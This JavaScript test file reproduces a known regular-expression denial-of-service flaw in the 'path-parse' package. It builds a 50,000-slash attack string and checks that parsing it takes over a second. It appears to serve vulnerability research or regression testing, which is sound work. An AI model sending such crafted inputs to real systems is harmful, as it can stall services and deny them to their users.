function build_attack(n) {
  var ret = "";
  for (var i = 0; i < n; i++) {
    ret += "/";
  }
  return ret + "\u25CE";
}
test("ReDos in path-parse", () => {
  const measureTime = require("../utils").measureTime;
  const pathParse = require("path-parse");
  let t = measureTime(function () {
    let attack_str = build_attack(50000);
    pathParse(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
